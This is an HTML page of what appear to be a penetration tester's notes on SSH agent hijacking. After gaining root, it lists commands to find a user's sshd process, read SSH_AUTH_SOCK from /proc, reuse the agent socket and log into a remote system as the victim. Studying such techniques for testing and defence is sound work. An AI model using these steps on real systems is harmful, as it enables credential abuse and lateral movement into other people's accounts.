<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SSH Hijacking</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>SSH Hijacking</h1><br /><br /><strong><span style="color:#ff0000;">WARNING: TO BE
        TESTED</span></strong><br /><strong>
      <h3>Prerequisite:</h3>
    </strong><br />• <strong>root</strong> on the target system<br /><br />If we are root on the compromised system, it
    is then possible to either:<br /> ◇ compromise the SSH agent <br /> ◇ access the SSH agent’s unix domain socket and
    hijack the connection.<br /><br />The reason this is possible is that the <strong>ssh-agent</strong> creates a <span
      style="text-decoration:underline;">unix domain socket</span>, and then listens for connections from the sshd
    daemon to this socket.<br />The protection of the <span style="text-decoration:underline;">socket</span> relies on
    simple <em>unix permissions</em>, which ultimately means that any authentication keys that are used with that socket
    can be retrieved by any user who can connect to the socket itself.<br /><br /><strong>Vulnerability</strong><br />To
    reduce friction and make the experience more smooth many organizations employ the use of SSH-agent which is a
    service that allows authentication via a local socket file. <br /><br /><strong>Exploit</strong><br />1. We first
    determine the SSH process ID of the user on the compromised host:<br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;ps&nbsp;aux&nbsp;|&nbsp;grep&nbsp;sshd</div>
    </div><br /> <a href=""><img src="images/1460-1.png" alt="images/1460-1.png" /></a><br />2. Next, we determine the
    SSH_AUTH_SOCK environment variable for the sshd PID:<br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;grep&nbsp;SSH_AUTH_SOCK&nbsp;/proc/&lt;PID&gt;/environ</div>
    </div><br />3. We then hijack the targets ssh-agent socket:<br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;SSH_AUTH_SOCK=/tmp/ssh-XXXXXXX/agent.XXXX&nbsp;ssh-add&nbsp;–l</div>
    </div><br />4. Finally, we log into the remote system our victim is logged into as the target:<br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;ssh&nbsp;remotesystem&nbsp;-l&nbsp;victim</div>
    </div><br /> <br /><br />Bibliography:<br />• <a
      href="https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=dfe66853-a519-4b96-81b6-e7cbbdfc8c53&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments" target="_blank">https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=dfe66853-a519-4b96-81b6-e7cbbdfc8c53&amp;CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&amp;tab=librarydocuments</a><br />•
    <a
      href="https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/" target="_blank">https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/</a><br />•
  </div>
</body>

</html>